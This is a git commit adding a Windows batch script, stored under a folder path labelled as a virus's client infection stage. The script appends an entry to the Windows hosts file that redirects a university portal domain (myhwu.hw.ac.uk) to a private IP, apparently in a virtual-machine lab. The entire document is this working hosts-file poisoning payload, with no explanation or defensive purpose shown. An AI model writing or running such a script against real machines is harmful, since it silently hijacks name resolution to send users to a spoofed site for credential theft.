6883e431e877d8957527e6b7709221de4557df28
RajJagasia <106627812+RajJagasia@users.noreply.github.com>
2024-03-16 15:25:56 +0400

    Add files via upload

---
+++ Virus/client_infection/v.cmd
@@ -0,0 +1,9 @@
+@echo off
+setlocal enabledelayedexpansion
+
+set "hosts_path=C:\Windows\System32\drivers\etc\hosts"
+set "new_entry=10.0.2.4 myhwu.hw.ac.uk"
+
+echo %new_entry%>>"%hosts_path%"
+
+exit /b
